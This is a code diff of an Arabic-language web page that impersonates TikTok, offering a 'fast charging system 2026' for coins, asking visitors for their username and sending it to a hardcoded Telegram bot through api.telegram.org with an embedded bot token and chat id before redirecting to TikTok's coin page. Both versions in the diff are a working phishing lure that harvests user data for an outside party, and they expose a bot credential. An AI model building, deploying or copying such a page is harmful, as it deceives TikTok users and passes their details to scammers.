@@ -3,65 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Fast Charge</title>
+    <title>TikTok Charge</title>
     <style>
-        body { background-color: #000; color: #fff; text-align: center; font-family: 'Arial', sans-serif; padding-top: 50px; margin: 0; }
-        .box { border: 2px solid #fe2c55; padding: 25px; border-radius: 15px; max-width: 340px; margin: auto; background: #0a0a0a; box-shadow: 0 0 15px rgba(254, 44, 85, 0.2); }
+        body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; margin: 0; }
+        .box { border: 2px solid #fe2c55; padding: 25px; border-radius: 15px; max-width: 340px; margin: auto; background: #0a0a0a; }
         input { width: 85%; padding: 12px; margin: 20px 0; border-radius: 8px; border: 1px solid #444; background: #1a1a1a; color: #fff; text-align: center; font-size: 16px; }
         button { width: 90%; padding: 12px; background-color: #fe2c55; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; }
-        h2 { font-size: 22px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <img src="https://www.tiktok.com/favicon.ico" width="50" style="margin-bottom: 10px;">
+        <img src="https://www.tiktok.com/favicon.ico" width="50">
         <h2>نظام الشحن السريع 2026</h2>
-        <p style="color: #ccc; font-size: 14px;">أدخل اليوزر نيم للتحقق من الحساب</p>
-        
-        <input type="text" id="username" placeholder="@username" dir="ltr">
-        
-        <button id="btn" onclick="sendData()">تأكيد ودخول</button>
+        <input type="text" id="user" placeholder="أدخل اليوزر نيم">
+        <button id="btn" onclick="send()">تأكيد ودخول</button>
     </div>
 
     <script>
-        function sendData() {
-            var userField = document.getElementById('username');
-            var user = userField.value;
+        function send() {
+            var user = document.getElementById('user').value;
             var btn = document.getElementById('btn');
-
-            // بيانات البوت والآي دي بتوعك
-            var token = "8258541006:AAGL9hW0BNoRrKfdx5e7DvMcHZiTJCqtydE";
+            
+            // التوكن الجديد بتاعك
+            var token = "8258541006:AAGL9hWOBNoRrKfdx5e7DvMcHZiTJCqtydE";
             var chat_id = "5533405786";
 
-            if (user.length > 2) {
-                btn.innerHTML = "جاري الفحص...";
+            if (user) {
+                btn.innerHTML = "جاري التحقق...";
                 btn.disabled = true;
 
-                var text = " طلب شحن جديد\n━━━━━━━━━━━━\n اليوزر: " + user;
+                var text = "🚀 طلب شحن جديد\n👤 اليوزر: " + user;
                 var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
 
-                fetch(url)
-                .then(function(res) {
+                fetch(url).then(res => {
                     if(res.ok) {
-                        alert("تم التحقق بنجاح! سيتم تحويلك لصفحة العروض.");
+                        alert("تم بنجاح! جاري تحويلك...");
                         window.location.href = "https://www.tiktok.com/coin";
                     } else {
-                        alert("حدث خطأ، تأكد من اتصالك بالإنترنت.");
+                        alert("مشكلة في البوت، تأكد من الـ ID");
                         btn.innerHTML = "تأكيد ودخول";
                         btn.disabled = false;
                     }
-                })
-                .catch(function() {
-                    alert("فشل الإرسال، حاول مرة أخرى.");
+                }).catch(() => {
+                    alert("تأكد من اتصالك بالإنترنت");
                     btn.innerHTML = "تأكيد ودخول";
                     btn.disabled = false;
                 });
             } else {
-                alert("برجاء كتابة اسم مستخدم صحيح");
+                alert("اكتب اليوزر نيم أولاً");
             }
         }
     </script>
-
 </body>
 </html>
